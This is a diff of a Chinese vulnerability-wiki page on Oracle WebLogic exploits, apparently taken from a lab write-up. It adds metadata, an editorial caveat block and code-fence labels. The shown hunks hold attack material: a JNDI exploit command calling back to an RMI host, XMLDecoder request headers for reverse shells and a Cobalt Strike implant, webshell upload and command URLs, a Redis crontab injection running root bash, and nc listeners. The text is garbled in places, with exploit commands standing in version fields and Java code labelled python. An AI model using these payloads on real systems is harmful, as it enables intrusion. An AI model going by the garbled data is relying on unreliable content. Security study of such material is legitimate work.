@@ -1,9 +1,66 @@
 ---
 version: "java -jar weblogic_CVE_2020_2551.jar 192.168.0.111 7001 rmi://192.168.0.50:1099/"
 source: "MrWQ/vulnerability-paper"
+title: "中间件常见漏洞之 weblogic"
+product: "Oracle WebLogic / conditional Redis chain"
+record_type: "vulnerability"
+review_status: "text-reviewed"
+verification_status: "not-reproduced"
+content_status: "needs-review"
+identifier_status: "active"
+primary_identifiers: "CVE-2017-3506; CVE-2017-10271; CVE-2019-2725; CVE-2018-2628; CVE-2018-2894; CVE-2014-4210; CVE-2020-14882; CVE-2020-14883; CVE-2020-2551; CVE-2021-2109"
+referenced_identifiers: "CVE-2015-4852; CVE-2016-0638; CVE-2016-3510; CVE-2017-3248; CVE-2017-3241"
+identifier_role: "primary"
+cve: "CVE-2017-3506; CVE-2017-10271; CVE-2019-2725; CVE-2018-2628; CVE-2018-2894; CVE-2014-4210; CVE-2020-14882; CVE-2020-14883; CVE-2020-2551; CVE-2021-2109"
+prerequisites: "Per-section patch/runtime/protocol/test-page/auth/Redis write conditions; not all product-wide"
+affected_versions: "java -jar weblogic_CVE_2020_2551.jar 192.168.0.111 7001 rmi://192.168.0.50:1099/"
+source_url: "https://mp.weixin.qq.com/s/r_ifxjyu5BiiZoB8n9GoEA"
+source_status: "recorded"
+side_effects: "含计划任务、启动项或 SSH 授权文件写入：会改变后续执行或登录行为。测试前备份原文件，结束后恢复原内容、权限与属主，不覆盖生产文件。; 含反向连接或交互式命令执行方法：会产生出站连接和子进程；目标、监听端与网络须在授权隔离范围内，结束后关闭会话并核对遗留进程。; 含落盘脚本或账户创建：会留下持久状态。记录本次生成的路径或账户，测试后清理这些对象并撤销关联令牌；不要删除既有业务对象。; 涉及 LDAP/RMI/DNS/HTTP 外带：回连只证明相应网络交互，不能单独证明命令执行；使用自控接收端，避免把日志、凭据或真实业务数据发送给第三方。"
+id: "vw-9b26c32610cdfbbc61d77bcf"
+entity_id: "ve-9b26c32610cdfbbc61d77bcf"
+schema_version: "1"
 ---
 
 # 中间件常见漏洞之 weblogic
+
+<!-- vulwiki-editorial:start -->
+## 校订与适用边界
+
+- 适用前提：Per-section patch/runtime/protocol/test-page/auth/Redis write conditions; not all product-wide
+- 证据范围：Full 47,567 characters read in three overlapping parts. Useful independent lab observations, severely damaged code and dangerous remediation errors. Many XML class attributes appear systematically stripped.
+
+### 本次正文校订
+
+- 按实际内容修正 14 处代码围栏语言标记，保留其中方法与请求内容。
+
+### 尚未解决的证据缺口
+
+以下限制仍适用于后文历史材料；相关版本、结果或修复结论不能据此视为已验证：
+
+- XMLDecoder java/object/void/array class attributes removed, Spring bean class absent in all three examples, new/method attributes stripped; these samples cannot perform described actions
+- 3506 bypass prose loses both tag names and example still uses object
+- 2725 prose describes UnitOfWorkChangeSet byte-array chain but request is malformed ProcessBuilder-style string-array chain
+- Raw XML ampersands, missing HTTP blank lines, repeated conflicting headers and concatenated Redis commands
+- Changing WebLogic7001 to8080 is not a fix; blocking T3 does not stop IIOP2551 or HTTP2109
+- Selecting ConnectionFilterImpl alone lacks deny rules; generic claim latest2628patch bypassed needs historical follow-on-CVE context
+- UDDI reachability falsely treated as proof; Redis IP .2 versus final .3 inconsistent
+- Blanket disable Windows Defender advice and broad deletion /usr/bin/java* are unsafe lab setup, not necessary vulnerability remediation
+- Root cron overwrite, uploaded JSP/executables and changed work paths lack cleanup and privilege constraints
+- Deployed base versions not full affected matrix; default JDK1.6 claim and latest14 are historical
+- Independent Windows/production-mode observations should be preserved, not bulk-delete as same-CVE duplicates
+
+### 操作风险与资料使用
+
+- 含计划任务、启动项或 SSH 授权文件写入：会改变后续执行或登录行为。测试前备份原文件，结束后恢复原内容、权限与属主，不覆盖生产文件。
+- 含反向连接或交互式命令执行方法：会产生出站连接和子进程；目标、监听端与网络须在授权隔离范围内，结束后关闭会话并核对遗留进程。
+- 含落盘脚本或账户创建：会留下持久状态。记录本次生成的路径或账户，测试后清理这些对象并撤销关联令牌；不要删除既有业务对象。
+- 涉及 LDAP/RMI/DNS/HTTP 外带：回连只证明相应网络交互，不能单独证明命令执行；使用自控接收端，避免把日志、凭据或真实业务数据发送给第三方。
+
+本页为文本校订，未执行代码、PoC 或目标请求；原图仅保留引用，未据此确认复现成功。
+<!-- vulwiki-editorial:end -->
+
+## 技术正文与历史材料
 
 <meta name="referrer" content="no-referrer"/>
 > 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/r_ifxjyu5BiiZoB8n9GoEA)
@@ -206,7 +263,7 @@ Weblogic 的 WLS Security 组件对外提供 webservice 服务，其中使用了
 
 构造 HTTP 请求包如下，需要注意的是 Content-Type 应改为 text/xml，否则会导致 XMLDecoder 不解析。
 
-```
+```http
 POST /wls-wsat/CoordinatorPortType HTTP/1.1
 Host: 192.168.0.105:7001
 Accept-Encoding: gzip, deflate
@@ -276,7 +333,7 @@ docker-compose up -d
 
 构造如下 payload 用于反弹 shell
 
-```
+```http
 POST /wls-wsat/CoordinatorPortType HTTP/1.1
 Host: 192.168.0.107:7001
 Accept-Encoding: gzip, deflate
@@ -324,14 +381,14 @@ Content-Length: 633
 
 在本地开启 http 服务
 
-```
+```shell
 python -m SimpleHTTPServer 80
 
 ```
 
 发送 payload 运行木马上线 CS
 
-```
+```http
 POST /wls-wsat/CoordinatorPortType HTTP/1.1
 Host: 192.168.0.105:7001
 Accept-Encoding: gzip, deflate
@@ -530,7 +587,7 @@ public UnitOfWorkChangeSet(byte[] bytes) throws java.io.IOException, ClassNotFou
 
 UnitOfWorkChangeSet 中的参数是 Byte 数组，因此需将 payload 转换为 Byte 数组才能完成执行，构造 payload 如下：
 
-```
+```http
 POST /_async/AsyncResponseService HTTP/1.1
 Host: 192.168.0.107:7001
 Upgrade-Insecure-Requests: 1
@@ -727,7 +784,7 @@ docker-compose up -d
 
 使用工具检测是否存在 CVE-2018-2628 漏洞，结果显示目标存在该漏洞
 
-```
+```shell
  python CVE-2018-2628-poc.py 192.168.0.107 7001
 
 ```
@@ -738,7 +795,7 @@ docker-compose up -d
 
 使用工具直接上传 shell
 
-```
+```shell
 python CVE-2018-2628-Getshell.py 192.168.0.102 7001 shell1.jsp
 
 ```
@@ -768,7 +825,7 @@ http://192.168.0.107:7001/bea_wls_internal/shell1.jsp?tom=d2hvYW1pCg==，成功�
 
 利用脚本执行连接上传的 shell
 
-```
+```shell
 python cve-2018-2628.py
 > http://192.168.0.105:7001/bea_wls_internal/wlscmd.jsp
 
@@ -852,7 +909,7 @@ C:\Oracle\Middleware\Oracle_Home\user_projects\domains\base_domain\servers\Admin
 
 接下来测试 vulhub 环境，其中 Weblogic 的密码为 EfWP0enw，如果不知道可在靶机中运行如下命令：
 
-```
+```shell
 sudo docker-compose logs | grep password
 
 ```
@@ -979,7 +1036,7 @@ set%201%20%22%5Cn%5Cn%5Cn%5Cn0-59%200-23%201-31%201-12%200-6%20root%20bash%20-c%
 
 完成后可进入靶机进行查看，在 docker 中查看容器 ID
 
-```
+```shell
 docker ps
 
 ```
@@ -988,7 +1045,7 @@ docker ps
 
 发现 c6f7 开放 Weblogic 服务，其 IP 地址为 172.24.0.2；而 7704 开放 redis 服务，其 IP 地址为 172.24.0.3，进入 7704 查看计划任务
 
-```
+```shell
 docker exec -it 7704 bash
 cd /etc/
 cat crontab
@@ -999,7 +1056,7 @@ cat crontab
 
 发现计划任务已经写入，在本机（172.24.0.1）中开启 nc 监听可成功收到反弹 shell
 
-```
+```shell
 nc -nvlp 6666
 
 ```
@@ -1122,7 +1179,7 @@ docker-compose up -d
 
 在本地开启 http 服务并监听 6666 端口
 
-```
+```shell
 python -m SimpleHTTPServer 80
 
 ```
@@ -1213,7 +1270,7 @@ python -m SimpleHTTPServer 80
 
 在 exp.java 中发现其调用计算器程序
 
-```
+```python
 import java.io.IOException;
 public class exp {
   static{
